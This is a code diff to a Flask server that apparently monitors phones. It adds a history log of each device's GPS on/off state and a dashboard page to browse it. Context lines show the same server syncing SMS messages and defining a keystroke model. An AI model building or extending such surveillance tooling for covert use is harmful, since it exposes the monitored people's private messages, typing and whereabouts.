@@ -157,6 +157,16 @@ class SmsMessage(db.Model):
     synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
 
 
+class GpsLog(db.Model):
+    __tablename__ = 'gps_logs'
+    id = pk_column()
+    device_id = db.Column(db.String(64), nullable=False, index=True)
+    is_enabled = db.Column(db.Boolean, nullable=False)
+    occurred_at = db.Column(db.DateTime, nullable=False, index=True)
+    synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
+
+
+
 # ─── Phase 2 models (created now, ready for future expansion) ────────
 
 class Keystroke(db.Model):
@@ -281,20 +291,30 @@ def device_ping():
         device.storage_used_percent = data['storage_used_percent']
     if 'uptime_seconds' in data:
         device.uptime_seconds = data['uptime_seconds']
-    if 'gps_enabled' in data:
+    if 'gps_enabled' in data and data['gps_enabled'] is not None:
+        device.gps_enabled = bool(data['gps_enabled'])
+        if 'gps_last_changed_ts' in data and data['gps_last_changed_ts']:
+            try:
+                device.gps_state_changed_at = datetime.fromtimestamp(data['gps_last_changed_ts'] / 1000.0, timezone.utc)
+            except Exception:
+                pass
+        elif not device.gps_state_changed_at:
+            device.gps_state_changed_at = now
 
-        device.gps_enabled = data['gps_enabled']
-    if 'gps_last_changed_ts' in data and data['gps_last_changed_ts']:
-        try:
-            device.gps_state_changed_at = datetime.fromtimestamp(data['gps_last_changed_ts'] / 1000.0, timezone.utc)
-        except Exception:
-            pass
-    elif 'gps_enabled' in data and not device.gps_state_changed_at:
-        device.gps_state_changed_at = now
+        # Record in historical GPS log if state changed or first entry
+        latest_gps = GpsLog.query.filter_by(device_id=device.device_id).order_by(GpsLog.occurred_at.desc()).first()
+        if not latest_gps or latest_gps.is_enabled != device.gps_enabled:
+            gps_entry = GpsLog(
+                device_id=device.device_id,
+                is_enabled=device.gps_enabled,
+                occurred_at=device.gps_state_changed_at or now
+            )
+            db.session.add(gps_entry)
 
     if 'recent_logs' in data and isinstance(data['recent_logs'], list):
         import json
         device.recent_logs = json.dumps(data['recent_logs'])
+
 
     db.session.commit()
 
@@ -562,6 +582,34 @@ def dashboard_sms():
                            devices=devices,
                            current_contact=contact_filter,
                            current_device=device_filter)
+
+
+@app.route('/dashboard/gps')
+@require_login
+def dashboard_gps():
+    """GPS State History view."""
+    device_filter = request.args.get('device')
+    state_filter = request.args.get('state')
+    page = request.args.get('page', 1, type=int)
+    per_page = 30
+
+    query = db.session.query(GpsLog, Device.device_model).outerjoin(Device, GpsLog.device_id == Device.device_id)
+
+    if device_filter:
+        query = query.filter(GpsLog.device_id == device_filter)
+    if state_filter in ['on', 'off']:
+        query = query.filter(GpsLog.is_enabled == (state_filter == 'on'))
+
+    pagination = query.order_by(GpsLog.occurred_at.desc()).paginate(page=page, per_page=per_page, error_out=False)
+    devices = Device.query.order_by(Device.last_ping.desc()).all()
+
+    return render_template('gps.html',
+                           gps_logs=pagination.items,
+                           pagination=pagination,
+                           devices=devices,
+                           current_device=device_filter,
+                           current_state=state_filter)
+
 
 
 @app.route('/api/v1/export')
